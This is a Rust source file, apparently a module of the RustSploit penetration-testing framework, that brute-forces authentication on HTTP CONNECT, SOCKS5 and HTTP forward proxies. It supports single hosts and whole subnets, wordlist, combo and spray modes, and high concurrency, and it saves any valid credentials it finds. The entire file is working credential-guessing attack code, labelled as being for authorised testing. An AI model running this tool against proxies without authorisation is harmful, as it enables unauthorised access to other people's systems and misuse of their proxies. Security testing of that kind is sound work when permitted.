//! Proxy Authentication Bruteforce Module
//!
//! Bruteforces authenticated proxies: HTTP CONNECT (Basic/Digest),
//! SOCKS5 username/password, and HTTP forward proxies.
//!
//! FOR AUTHORIZED PENETRATION TESTING ONLY.

use anyhow::{ anyhow, Context, Result };
use colored::*;
use std::net::IpAddr;
use std::time::Duration;
use base64::Engine as _;
use tokio::io::{ AsyncReadExt, AsyncWriteExt };

use crate::module::{ Finding, FindingKind, ModuleCtx, ModuleOutcome };
use crate::utils::{
    cfg_prompt_default,
    cfg_prompt_existing_file,
    cfg_prompt_int_range,
    cfg_prompt_output_file,
    cfg_prompt_port,
    cfg_prompt_yes_no,
    load_lines,
    normalize_target,
};
use crate::utils::wordlist;
use crate::utils::{
    generate_combos_mode,
    parse_combo_mode,
    load_credential_file,
    BruteforceConfig,
    LoginResult,
    SubnetScanConfig,
    run_bruteforce,
    run_subnet_bruteforce,
    is_subnet_target,
};

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "Proxy Bruteforce".to_string(),
        description: "Bruteforces proxy authentication for HTTP CONNECT (Basic auth), SOCKS5 (username/password), and HTTP forward proxies. Supports combo, spray, and credential file modes.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
        default_port: None,
    }
}

// ============================================================================
// PROXY AUTH TYPES
// ============================================================================

#[derive(Clone, Copy, Debug)]
enum ProxyType {
    HttpConnect,
    Socks5,
    HttpForward,
}

impl ProxyType {
    fn from_str(s: &str) -> Self {
        match s.trim().to_lowercase().as_str() {
            "socks5" | "socks" => Self::Socks5,
            "http_forward" | "forward" | "transparent" => Self::HttpForward,
            _ => Self::HttpConnect,
        }
    }

    fn name(&self) -> &'static str {
        match self {
            Self::HttpConnect => "HTTP CONNECT",
            Self::Socks5 => "SOCKS5",
            Self::HttpForward => "HTTP Forward",
        }
    }

    fn default_port(&self) -> u16 {
        match self {
            Self::HttpConnect => 8080,
            Self::Socks5 => 1080,
            Self::HttpForward => 3128,
        }
    }
}

// ============================================================================
// AUTH ATTEMPTS
// ============================================================================

/// Try HTTP CONNECT proxy with Basic auth.
async fn try_http_connect_auth(
    target: &str, port: u16, user: &str, pass: &str, timeout_ms: u64,
) -> LoginResult {
    let addr = format!("{}:{}", target, port);
    let dur = Duration::from_millis(timeout_ms);

    let stream = match crate::utils::network::tcp_connect(&addr, dur).await {
        Ok(s) => s,
        Err(e) => return LoginResult::Error { message: e.to_string(), retryable: true },
    };
    let mut stream = stream;

    // Basic auth header
    let cred = base64::engine::general_purpose::STANDARD.encode(format!("{}:{}", user, pass));
    let req = format!(
        "CONNECT httpbin.org:80 HTTP/1.1\r\nHost: httpbin.org\r\nProxy-Authorization: Basic {}\r\n\r\n",
        cred
    );

    if let Err(e) = tokio::time::timeout(dur, stream.write_all(req.as_bytes())).await {
        return LoginResult::Error { message: format!("Write timeout: {}", e), retryable: true };
    }

    let mut buf = [0u8; 1024];
    let n = match tokio::time::timeout(dur, stream.read(&mut buf)).await {
        Ok(Ok(n)) if n > 0 => n,
        Ok(Ok(n)) => { tracing::trace!("proxy read returned {n} bytes (empty)"); return LoginResult::Error { message: "Empty response".to_string(), retryable: false }; }
        Ok(Err(e)) => return LoginResult::Error { message: e.to_string(), retryable: true },
        Err(e) => return LoginResult::Error { message: format!("Read timeout: {e}"), retryable: true },
    };

    let resp = String::from_utf8_lossy(&buf[..n]);
    if resp.contains("200") {
        LoginResult::Success
    } else if resp.contains("407") || resp.contains("401") || resp.contains("403") {
        LoginResult::AuthFailed
    } else {
        LoginResult::Error { message: format!("Unexpected: {}", resp.lines().next().unwrap_or("")), retryable: false }
    }
}

/// Try SOCKS5 proxy with username/password auth (RFC 1929).
async fn try_socks5_auth(
    target: &str, port: u16, user: &str, pass: &str, timeout_ms: u64,
) -> LoginResult {
    let addr = format!("{}:{}", target, port);
    let dur = Duration::from_millis(timeout_ms);

    let mut stream = match crate::utils::network::tcp_connect(&addr, dur).await {
        Ok(s) => s,
        Err(e) => return LoginResult::Error { message: e.to_string(), retryable: true },
    };

    // SOCKS5 greeting: version 5, 1 method, username/password (0x02)
    match tokio::time::timeout(dur, stream.write_all(&[0x05, 0x01, 0x02])).await {
        Ok(Ok(())) => {}
        Ok(Err(e)) => {
            tracing::trace!("SOCKS5 greeting write failed: {e}");
            return LoginResult::Error { message: "Greeting write failed".to_string(), retryable: true };
        }
        Err(e) => {
            tracing::trace!("SOCKS5 greeting write timed out: {e}");
            return LoginResult::Error { message: "Greeting timeout".to_string(), retryable: true };
        }
    }

    let mut buf = [0u8; 2];
    match tokio::time::timeout(dur, stream.read_exact(&mut buf)).await {
        Ok(Ok(n)) => { tracing::trace!("SOCKS5 greeting read_exact returned {n} bytes"); }
        _ => return LoginResult::Error { message: "Greeting response timeout".to_string(), retryable: true },
    }

    if buf[0] != 0x05 {
        return LoginResult::Error { message: "Not SOCKS5".to_string(), retryable: false };
    }
    if buf[1] != 0x02 {
        return LoginResult::Error { message: format!("Auth method {} not user/pass", buf[1]), retryable: false };
    }

    // RFC 1929 username/password auth
    let user_bytes = user.as_bytes();
    let pass_bytes = pass.as_bytes();
    if user_bytes.len() > 255 || pass_bytes.len() > 255 {
        return LoginResult::Error { message: "Credentials too long (max 255 bytes each)".to_string(), retryable: false };
    }

    let mut auth_pkt = vec![0x01u8]; // version
    auth_pkt.push(user_bytes.len() as u8);
    auth_pkt.extend_from_slice(user_bytes);
    auth_pkt.push(pass_bytes.len() as u8);
    auth_pkt.extend_from_slice(pass_bytes);

    match tokio::time::timeout(dur, stream.write_all(&auth_pkt)).await {
        Ok(Ok(())) => {}
        Ok(Err(e)) => {
            tracing::trace!("SOCKS5 auth write failed: {e}");
            return LoginResult::Error { message: "Auth write failed".to_string(), retryable: true };
        }
        Err(e) => {
            tracing::trace!("SOCKS5 auth write timed out: {e}");
            return LoginResult::Error { message: "Auth write timeout".to_string(), retryable: true };
        }
    }

    let mut resp = [0u8; 2];
    match tokio::time::timeout(dur, stream.read_exact(&mut resp)).await {
        Ok(Ok(n)) => { tracing::trace!("SOCKS5 auth read_exact returned {n} bytes"); }
        _ => return LoginResult::Error { message: "Auth response timeout".to_string(), retryable: true },
    }

    if resp[1] == 0x00 {
        LoginResult::Success
    } else {
        LoginResult::AuthFailed
    }
}

/// Try HTTP forward proxy with Basic auth.
async fn try_http_forward_auth(
    target: &str, port: u16, user: &str, pass: &str, timeout_ms: u64,
) -> LoginResult {
    let addr = format!("{}:{}", target, port);
    let dur = Duration::from_millis(timeout_ms);

    let mut stream = match crate::utils::network::tcp_connect(&addr, dur).await {
        Ok(s) => s,
        Err(e) => return LoginResult::Error { message: e.to_string(), retryable: true },
    };

    let cred = base64::engine::general_purpose::STANDARD.encode(format!("{}:{}", user, pass));
    let req = format!(
        "GET http://httpbin.org/ip HTTP/1.1\r\nHost: httpbin.org\r\nProxy-Authorization: Basic {}\r\nConnection: close\r\n\r\n",
        cred
    );

    match tokio::time::timeout(dur, stream.write_all(req.as_bytes())).await {
        Ok(Ok(())) => {}
        Ok(Err(e)) => {
            tracing::trace!("HTTP proxy request write failed: {e}");
            return LoginResult::Error { message: "Write failed".to_string(), retryable: true };
        }
        Err(e) => {
            tracing::trace!("HTTP proxy request write timed out: {e}");
            return LoginResult::Error { message: "Write timeout".to_string(), retryable: true };
        }
    }

    let mut buf = [0u8; 2048];
    let n = match tokio::time::timeout(dur, stream.read(&mut buf)).await {
        Ok(Ok(n)) if n > 0 => n,
        _ => return LoginResult::Error { message: "Read timeout".to_string(), retryable: true },
    };

    let resp = String::from_utf8_lossy(&buf[..n]);
    if resp.contains("200") && resp.contains("origin") {
        LoginResult::Success
    } else if resp.contains("407") || resp.contains("401") || resp.contains("403") {
        LoginResult::AuthFailed
    } else {
        LoginResult::Error { message: format!("HTTP {}", resp.lines().next().unwrap_or("")), retryable: false }
    }
}

/// Dispatch to the right auth function based on proxy type.
async fn try_proxy_auth(
    proxy_type: ProxyType, target: &str, port: u16, user: &str, pass: &str, timeout_ms: u64,
) -> LoginResult {
    match proxy_type {
        ProxyType::HttpConnect => try_http_connect_auth(target, port, user, pass, timeout_ms).await,
        ProxyType::Socks5 => try_socks5_auth(target, port, user, pass, timeout_ms).await,
        ProxyType::HttpForward => try_http_forward_auth(target, port, user, pass, timeout_ms).await,
    }
}

// ============================================================================
// MAIN
// ============================================================================

fn display_banner() {
    if crate::utils::is_batch_mode() { return; }
    crate::mprintln!("{}", "+=================================================================+".cyan());
    crate::mprintln!("{}", "|           Proxy Authentication Bruteforce                       |".cyan());
    crate::mprintln!("{}", "|   HTTP CONNECT (Basic) | SOCKS5 (RFC 1929) | HTTP Forward      |".cyan());
    crate::mprintln!("{}", "+=================================================================+".cyan());
    crate::mprintln!();
}

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx
        .target
        .as_single()
        .context("proxy_bruteforce requires a single-host target")?;

    // --- Subnet scan ---
    if is_subnet_target(target) {
        let proxy_type_input = cfg_prompt_default("proxy_type", "Proxy type (http_connect/socks5/http_forward)", "http_connect").await?;
        let proxy_type = ProxyType::from_str(&proxy_type_input);
        let port = cfg_prompt_port("port", &format!("{} port", proxy_type.name()), proxy_type.default_port()).await?;
        let users_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let pass_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = if wordlist::should_stream(&users_file) {
            let mut lines = Vec::new();
            let mut reader = wordlist::BatchedReader::open(&users_file).await?;
            while let Some(batch) = reader.next_batch().await? {
                lines.extend(batch);
            }
            lines
        } else {
            load_lines(&users_file)?
        };
        let passes = if wordlist::should_stream(&pass_file) {
            let mut lines = Vec::new();
            let mut reader = wordlist::BatchedReader::open(&pass_file).await?;
            while let Some(batch) = reader.next_batch().await? {
                lines.extend(batch);
            }
            lines
        } else {
            load_lines(&pass_file)?
        };
        if users.is_empty() { return Err(anyhow!("Username list empty")); }
        if passes.is_empty() { return Err(anyhow!("Password list empty")); }
        let concurrency = cfg_prompt_int_range("concurrency", "Concurrent hosts", 50, 1, 500).await? as usize;
        let verbose = cfg_prompt_yes_no("verbose", "Verbose output?", false).await?;
        let output_file = cfg_prompt_output_file("output_file", "Output file", "proxy_brute_subnet.txt").await?;

        let limiter = ctx.limiter.clone();
        let module_path = ctx.module_path.clone();
        let hits = run_subnet_bruteforce(target, port, users, passes, &SubnetScanConfig {
            concurrency,
            verbose,
            output_file,
            service_name: "proxy",
            jitter_ms: 50,
            source_module: "creds/generic/proxy_credcheck",
            skip_tcp_check: false,
            state_file: None,
        }, move |ip: IpAddr, port: u16, user: String, pass: String| {
            let limiter = limiter.clone();
            let module_path = module_path.clone();
            async move {
                let host = ip.to_string();
                limiter.acquire(&module_path, &host).await;
                try_proxy_auth(proxy_type, &host, port, &user, &pass, 5000).await
            }
        }).await?;
        let mut outcome = ModuleOutcome::ok();
        for (host, user, pass) in &hits {
            outcome.findings.push(Finding {
                target: host.clone(),
                kind: FindingKind::Credential,
                message: format!("Valid proxy credentials found: {}:{}", user, pass),
                data: Some(serde_json::json!({
                    "username": user,
                    "password": pass,
                    "service": "proxy",
                    "proxy_type": format!("{:?}", proxy_type),
                    "port": port,
                })),
            });
        }
        return Ok(outcome);
    }

    // --- Single target ---
    let mut outcome = ModuleOutcome::ok();
    display_banner();

    let proxy_type_input = cfg_prompt_default("proxy_type", "Proxy type (http_connect/socks5/http_forward)", "http_connect").await?;
    let proxy_type = ProxyType::from_str(&proxy_type_input);
    let normalized = normalize_target(target)?;
    let port = cfg_prompt_port("port", &format!("{} port", proxy_type.name()), proxy_type.default_port()).await?;

    let users_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
    let pass_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
    let usernames = if wordlist::should_stream(&users_file) {
        let mut lines = Vec::new();
        let mut reader = wordlist::BatchedReader::open(&users_file).await?;
        while let Some(batch) = reader.next_batch().await? {
            lines.extend(batch);
        }
        lines
    } else {
        load_lines(&users_file)?
    };
    let passwords = if wordlist::should_stream(&pass_file) {
        let mut lines = Vec::new();
        let mut reader = wordlist::BatchedReader::open(&pass_file).await?;
        while let Some(batch) = reader.next_batch().await? {
            lines.extend(batch);
        }
        lines
    } else {
        load_lines(&pass_file)?
    };
    if usernames.is_empty() { return Err(anyhow!("Username list empty")); }
    if passwords.is_empty() { return Err(anyhow!("Password list empty")); }

    let combo_input = cfg_prompt_default("combo_mode", "Combo mode (linear/combo/spray)", "combo").await?;
    let mut combos = generate_combos_mode(&usernames, &passwords, parse_combo_mode(&combo_input));
    if cfg_prompt_yes_no("cred_file", "Load additional user:pass combos from file?", false).await? {
        let cred_path = cfg_prompt_existing_file("cred_file_path", "Credential file (user:pass per line)").await?;
        combos.extend(load_credential_file(&cred_path)?);
    }

    let concurrency = cfg_prompt_int_range("concurrency", "Concurrent attempts", 10, 1, 100).await? as usize;
    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first valid credential?", true).await?;
    let verbose = cfg_prompt_yes_no("verbose", "Verbose output?", false).await?;
    let save_path = cfg_prompt_output_file("output_file", "Output file", "proxy_brute_results.txt").await?;
    let timeout_ms: u64 = cfg_prompt_default("timeout", "Timeout (ms)", "5000").await?.parse().unwrap_or(5000);

    crate::mprintln!("[*] Proxy: {} on {}:{}", proxy_type.name().cyan(), normalized, port);
    crate::mprintln!("[*] Combos: {}", combos.len());
    crate::mprintln!();

    let limiter = ctx.limiter.clone();
    let module_path = ctx.module_path.clone();
    let result = run_bruteforce(
        &BruteforceConfig {
            target: normalized,
            port,
            concurrency,
            stop_on_success,
            verbose,
            delay_ms: 0,
            jitter_ms: 50,
            max_retries: 2,
            service_name: "proxy",
            source_module: "creds/generic/proxy_credcheck",
        },
        combos,
        move |target: String, port: u16, user: String, pass: String| {
            let limiter = limiter.clone();
            let module_path = module_path.clone();
            async move {
                limiter.acquire(&module_path, &target).await;
                try_proxy_auth(proxy_type, &target, port, &user, &pass, timeout_ms).await
            }
        },
    ).await?;

    result.print_found();
    result.save_to_file(&save_path)?;

    for (host, user, pass) in &result.found {
        outcome.findings.push(Finding {
            target: host.clone(),
            kind: FindingKind::Credential,
            message: format!("Valid proxy credentials found: {}:{}", user, pass),
            data: Some(serde_json::json!({
                "username": user,
                "password": pass,
                "service": "proxy",
                "proxy_type": format!("{:?}", proxy_type),
                "port": port,
            })),
        });
    }
    Ok(outcome)
}

crate::register_native_module!(crate::module::Category::Creds, "generic/proxy_bruteforce", native);
